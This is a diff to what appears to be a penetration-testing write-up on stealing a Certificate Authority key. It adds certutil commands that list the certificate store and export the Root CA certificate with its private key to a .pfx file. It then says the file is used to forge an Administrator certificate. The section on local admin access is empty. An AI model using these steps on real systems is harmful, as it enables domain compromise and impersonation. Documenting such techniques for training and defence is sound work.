@@ -51,4 +51,29 @@ and it has:
 
 
 ***
-### How the CA Key Is Stolen:
+## How the CA Key Is Stolen:
+
+### 1 - If you have access on a local admin on the machine:
+
+
+
+
+
+
+
+***
+### 2- Exporting the certificate from cert store:
+
+view the cert store:
+```bash
+certutil -Store My
+```
+
+identify the serial number of the Root-CA and export it:
+```powershell
+certutil.exe -exportPFX My 75b2f4bbf31f108945147b466131bdca cert.pfx
+
+```
+
+With the .pfx in our hands we can proceed to forge our own certificate for the Administrator account and then finally achieve our final access.
+ 
